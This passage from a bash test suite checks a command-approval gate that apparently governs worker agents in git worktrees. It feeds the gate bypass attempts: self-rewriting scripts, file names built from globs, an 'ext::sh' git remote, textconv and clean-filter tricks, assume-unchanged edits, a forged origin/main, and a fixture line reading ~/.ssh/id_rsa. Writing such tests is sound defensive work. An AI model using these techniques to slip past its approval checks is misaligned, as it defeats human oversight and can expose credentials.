# between the two runs escalates too.
printf 'cp tmp/evil.sh tmp/selfcp.sh\n' > "$CRWT/tmp/selfcp.sh"
out="$(_cp_code_ref "cd $CRWT && bash tmp/selfcp.sh && bash tmp/selfcp.sh" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "a self-rewriting script run twice escalates" || bad "self-rewrite between runs slipped: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && bash tmp/clean.sh && bash tmp/clean.sh" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "the same script twice escalates (fails closed)" || bad "repeat run resolved: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && bash tmp/clean.sh && cp tmp/evil.sh tmp/clean.sh && bash tmp/clean.sh" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "a writer between two runs still escalates" || bad "writer between runs slipped: rc=$rc '$out'"
out="$(_cp_code_ref "cd $CRWT && bash tmp/clean.sh > tmp/clean.sh; bash tmp/clean.sh" "$CRWT")"; rc=$?
[ "$rc" = 3 ] && ok "a run that redirects onto the script still escalates" || bad "redirect-onto-script slipped: rc=$rc '$out'"

printf '== code by reference: order gate and unbound python -c (F8b, #160 round 3 H-b/H-c) ==\n'
# A writer that BUILDS the script's name (glob, brace, $var, a python string
# concat) is invisible to the name match; anything but read-only verbs
# around the one run makes the binding `order` (reviewed every run).
while IFS= read -r form; do
  [ -n "$form" ] || continue
  out="$(_cp_code_ref "cd $CRWT && $form" "$CRWT")"; rc=$?
  case "$rc:$out" in
    0:*"	order"|3:*) ok "order-unsafe is not a plain binding (rc=$rc): $form" ;;
    *) bad "order-unsafe bound plainly (rc=$rc '$out'): $form" ;;
  esac
done <<'EOF'
cp tmp/evil.sh tmp/clean.s?; bash tmp/clean.sh
cat tmp/evil.sh > tmp/clea?.sh; bash tmp/clean.sh
cp tmp/evil.sh tmp/clean.s[h]; bash tmp/clean.sh
tee tmp/clean.s{h,x} < tmp/evil.sh; bash tmp/clean.sh
d=tmp/clea; cp tmp/evil.sh ${d}n.sh; bash tmp/clean.sh
python3 -c 'open("tmp/clea"+"n.sh","w").write("x")'; bash tmp/clean.sh
cp tmp/evil.sh tmp/*an.sh; bash tmp/clean.sh
bash tmp/clean.sh >> tmp/clea?.sh
bash tmp/clean.sh | tee tmp/clean.s?
git pull && bash tmp/clean.sh
git diff --output=tmp/x && bash tmp/clean.sh
git -c diff.external=x diff && bash tmp/clean.sh
git stash && bash tmp/clean.sh
GIT_EXTERNAL_DIFF=x git diff; bash tmp/clean.sh
GIT_PAGER=x git log; bash tmp/clean.sh
git remote add x 'ext::sh -c true' && git remote update x && bash tmp/clean.sh
git branch --edit-description && bash tmp/clean.sh
EOF
for form in "bash tmp/clean.sh" "bash tmp/clean.sh 2>&1 | tail -3" "bash tmp/clean.sh && echo done" \
            "bash tmp/clean.sh > /tmp/out.txt" "bash tmp/clean.sh | grep hello | wc -l" \
            "bash tmp/clean.sh && git status" "git log --oneline -3 && bash tmp/clean.sh" "git remote -v && bash tmp/clean.sh"; do
  out="$(_cp_code_ref "cd $CRWT && $form" "$CRWT")"; rc=$?
  [ "$rc" = 0 ] && [ "$out" = "shell	$CRWT/tmp/clean.sh" ] \
    && ok "read-only company keeps a plain binding: $form" || bad "over-block: rc=$rc '$out': $form"
done
for form in "cd $CRWT && cd tmp && python3 -c 'import evil'" "cd $CRWT/tmp && python3 -c 'import evil'" \
            "cd $CRWT && (cd tmp; python3 -c 'import evil')" "cd $CRWT && pushd tmp && python3 -c 'import evil'" \
            "python3 -c 'import evil'" "python3 -c 'from . import evil'"; do
  out="$(_cp_code_ref "$form" "$CRWT")"; rc=$?
  [ "$rc" = 3 ] && ok "unbound-cwd python -c import escalates: $form" || bad "unbound python -c ran unjudged (rc=$rc '$out'): $form"
done
for form in "python3 -c 'import json; print(1)'" "cd $CRWT && cd tmp && python3 -c 'import json'"; do
  out="$(_cp_code_ref "$form" "$CRWT")"; rc=$?
  [ "$rc" = 1 ] && ok "stdlib-only python -c stays out of scope: $form" || bad "stdlib python -c over-blocked (rc=$rc): $form"
done

printf '== trunk-identical suite: one conductor review per worktree state (F5) ==\n'
# A test suite byte-identical to the trunk tip (as the REMOTE reports it) was
# reviewed at merge, so its reserved-looking FIXTURES are not a reason to
# refuse it. But it runs the worktree's lib, so the binding covers the suite
# AND the worktree's change-set: no change-set = only reviewed code runs
# (peer allow); a change-set = one conductor review per state.
command -v peer_decide >/dev/null 2>&1 || . "$here/lib/scoped-policy.sh"
command -v file_approval_record >/dev/null 2>&1 || . "$here/lib/run-registry.sh"
export HERDR_RUN_STATE_DIR="$WORK/f5-state"; mkdir -p "$HERDR_RUN_STATE_DIR"
F5O="$WORK/f5-origin.git"; F5W="$WORK/f5-wt"
git init -q --bare -b main "$F5O"
git clone -q "$F5O" "$F5W" 2>/dev/null
F5W="$(cd "$F5W" && pwd -P)"
mkdir -p "$F5W/lib"
printf 'x_ok() { echo fine; }\n' > "$F5W/lib/x.sh"
printf '#!/usr/bin/env bash\n# fixture strings a real suite carries:\n# gh pr merge 1 --squash ; cat ~/.ssh/id_rsa\n. "$(dirname "$0")/lib/x.sh"\nx_ok\n' > "$F5W/verify-x.sh"
printf 'notes\n' > "$F5W/README.md"
git -C "$F5W" add -A && git -C "$F5W" -c user.email=t@t -c user.name=t commit -qm base
git -C "$F5W" push -q origin HEAD:main 2>/dev/null
git -C "$F5W" fetch -q origin
git -C "$F5W" checkout -q -b fix/f5
F5TASK="$(jq -nc --arg wt "$F5W" '{worktree:$wt,branch:"fix/f5",trunk:"main",manifest:"",task_id:"taskF5"}')"
f5_decide() { peer_decide "$1" "$F5TASK"; }
f5_trunkish() { case "$PD_REASON" in *trunk*) return 0 ;; esac; return 1; }

f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && [ "$PD_VERDICT" = escalate ] && f5_trunkish \
  && ok "(A) unmodified suite, no worktree changes: still one conductor review (trunk path, not reserved)" \
  || bad "(A) clean state: rc=$rc $PD_VERDICT — $PD_REASON"
[ -n "$PD_CODE_SHA" ] && file_approval_record taskF5 "$PD_CODE_PATH" "$PD_CODE_SHA" conductor:test
f5_decide "cd $F5W && bash verify-x.sh 2>&1 | tail -3"; rc=$?
[ "$rc" = 0 ] && ok "(A-g) after approval, the piped form replays for the clean state" || bad "(A-g) clean replay: $PD_VERDICT — $PD_REASON"
mkdir -p "$F5W/tools"
printf '#!/bin/sh\n. "${NOTIFY_ENV:-$HOME/.config/x.env}"\ngh pr merge 1 --squash\n' > "$F5W/tools/notify.sh"
git -C "$F5W" add tools/notify.sh && git -C "$F5W" -c user.email=t@t -c user.name=t commit -qm notify
git -C "$F5W" push -q origin HEAD:main 2>/dev/null
f5_decide "cd $F5W && bash tools/notify.sh"; rc=$?
[ "$rc" != 0 ] && ! f5_trunkish && ok "(s) a trunk-identical script that is not a test entry point never takes the trunk path" \
  || bad "(s) non-suite script took the trunk path: rc=$rc $PD_VERDICT — $PD_REASON"

printf 'notes, edited\n' > "$F5W/README.md"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && [ "$PD_VERDICT" = escalate ] && f5_trunkish \
  && ok "(a) a change-set makes it escalate on the trunk path, not reserved" \
  || bad "(a) trunk suite: rc=$rc $PD_VERDICT — $PD_REASON"
sha_a="$PD_CODE_SHA"; path_a="$PD_CODE_PATH"
file_sha="$(shasum -a 256 < "$F5W/verify-x.sh" | cut -d' ' -f1)"
[ -n "$sha_a" ] && [ "$sha_a" != "$file_sha" ] \
  && ok "(a) the approval sha binds more than the file bytes" || bad "(a) PD_CODE_SHA is the bare file sha ($sha_a)"
[ -n "$sha_a" ] && file_approval_record taskF5 "$path_a" "$sha_a" conductor:test
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" = 0 ] && ok "(b) approved suite + same worktree state re-runs for a peer" || bad "(b) replay refused: $PD_VERDICT — $PD_REASON"
f5_decide "cd $F5W && bash verify-x.sh 2>&1 | tail -3"; rc=$?
[ "$rc" = 0 ] && ok "(g) the piped form binds the same way" || bad "(g) piped replay: $PD_VERDICT — $PD_REASON"
printf 'x_ok() { echo changed; }\n' > "$F5W/lib/x.sh"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && [ "$PD_VERDICT" = escalate ] && ok "(c) a lib edit changes the state: escalates again" || bad "(c) lib edit replayed: rc=$rc $PD_VERDICT"
git -C "$F5W" checkout -q -- lib/x.sh
printf 'echo new\n' > "$F5W/new-helper.sh"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && ok "(d) an untracked file changes the state: escalates again" || bad "(d) untracked file replayed"
rm -f "$F5W/new-helper.sh"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" = 0 ] && ok "(b2) back to the approved state: replays again" || bad "(b2) restored state refused: $PD_VERDICT — $PD_REASON"
printf 'x_ok() { echo hidden edit; }\n' > "$F5W/lib/x.sh"
git -C "$F5W" update-index --assume-unchanged lib/x.sh
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && ok "(j) an edit hidden by assume-unchanged still changes the state (raw bytes): escalates" || bad "(j) assume-unchanged hid an edit: rc=$rc $PD_VERDICT — $PD_REASON"
git -C "$F5W" update-index --no-assume-unchanged lib/x.sh
git -C "$F5W" checkout -q -- lib/x.sh
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" = 0 ] && ok "(b3) approved state replays before the filter attack" || bad "(b3) approved state refused: $PD_VERDICT — $PD_REASON"
F5GD="$(git -C "$F5W" rev-parse --absolute-git-dir)"; mkdir -p "$F5GD/info"
printf 'lib/x.sh diff=fake filter=same\n' > "$F5GD/info/attributes"
git -C "$F5W" config diff.fake.textconv 'echo FIXED'
git -C "$F5W" config filter.same.clean "git -C $F5W show HEAD:lib/x.sh"
printf 'x_ok() { echo filtered edit; }\n' > "$F5W/lib/x.sh"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && ok "(k) textconv/clean-filter cannot hide a lib edit from the change-set" || bad "(k) filter-hidden edit replayed: $PD_VERDICT — $PD_REASON"
rm -f "$F5GD/info/attributes"; git -C "$F5W" config --unset diff.fake.textconv; git -C "$F5W" config --unset filter.same.clean
git -C "$F5W" checkout -q -- lib/x.sh
printf 'lib/hidden.sh\n' > "$F5W/.gitignore"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && ! f5_trunkish && ok "(h) a changed .gitignore disqualifies the trunk path" || bad "(h) .gitignore change kept the trunk path: rc=$rc $PD_VERDICT — $PD_REASON"
rm -f "$F5W/.gitignore"
f5_decide "cd $F5W && bash verify-x.sh; cp /dev/null lib/x.sh"; rc=$?
[ "$rc" != 0 ] && ! f5_trunkish && ok "(i) the order gate beats the trunk path" || bad "(i) order-unsafe command took the trunk path: rc=$rc $PD_VERDICT — $PD_REASON"
printf '# edited suite\n' >> "$F5W/verify-x.sh"
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && ! f5_trunkish && ok "(e) a worker-modified suite leaves the trunk path ($PD_VERDICT)" || bad "(e) modified suite: rc=$rc $PD_VERDICT — $PD_REASON"
git -C "$F5W" checkout -q -- verify-x.sh
git -C "$F5W" -c user.email=t@t -c user.name=t commit -qam readme
printf '# forged trunk\n' >> "$F5W/verify-x.sh"
git -C "$F5W" -c user.email=t@t -c user.name=t commit -qam forged
git -C "$F5W" update-ref refs/remotes/origin/main HEAD
f5_decide "cd $F5W && bash verify-x.sh"; rc=$?
[ "$rc" != 0 ] && ! f5_trunkish && ok "(f) origin/main moved locally to the worker's commit: no trunk path" || bad "(f) forged trunk accepted: rc=$rc $PD_VERDICT — $PD_REASON"
git -C "$F5W" push -q origin HEAD:refs/heads/fix/f5 2>/dev/null
peer_decide "cd $F5W && bash verify-x.sh" "$F5TASK"; rc=$?
[ "$rc" != 0 ] && ! f5_trunkish && ok "(f2) the worker's own branch on the remote is not trunk" || bad "(f2) own branch taken as trunk: rc=$rc $PD_VERDICT — $PD_REASON"
printf -- '-----\npassed=%s failed=%s\n' "$pass" "$fail"
[ "$fail" -eq 0 ] && echo PASS || { echo FAIL; exit 1; }
